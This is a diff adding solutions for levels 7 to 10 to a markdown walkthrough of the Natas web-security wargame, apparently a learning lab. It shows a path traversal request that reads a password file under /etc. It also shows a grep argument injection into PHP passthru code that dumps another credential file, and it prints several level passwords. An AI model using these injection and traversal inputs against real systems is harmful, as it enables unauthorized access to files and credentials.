@@ -5,7 +5,7 @@ Looking at source reveals the password
 ```
 
 ## Level 1
-Although right-click has been block, `Ctrl + U`(Chromium) should show source.
+Although right-click has been blocked, `Ctrl + U`(Chromium) should show source.
 ```
 <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
 ```
@@ -49,9 +49,40 @@ Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
 ```
 
 ## Level 7
+`/index.php?page=about` suggests that we've encountered a simple LFI. Hint in source code allows us to build request `index.php?page=../../../../../../etc/natas_webpass/natas8` which leads us to password `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`
+
 ## Level 8
+We have to undo actions performed to get `$encodedSecret`. To do this, first we convert hex to bytes, then reverse the string and unbase64.
+```
+encoded: 3d3d516343746d4d6d6c315669563362
+unhexlified: ==QcCtmMml1ViV3b
+reversed: b3ViV1lmMmtCcQ==
+unbased: oubWYf2kBq
+```
+Submitting it revals the password: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`
+
 ## Level 9
+Let's take a look at source code.
+```
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+```
+Seems like we have to convince `grep` to match everything and read desired file. To match eveything, we'll use `'^\S*'`.
+Passing `'^\S*' /etc/natas_webpass/natas10 #` will print the password `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`.
+
 ## Level 10
+Our clever trick from previous level will work here as well, revealing password `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`.
+
+
 ## Level 11
 ## Level 12
 ## Level 13
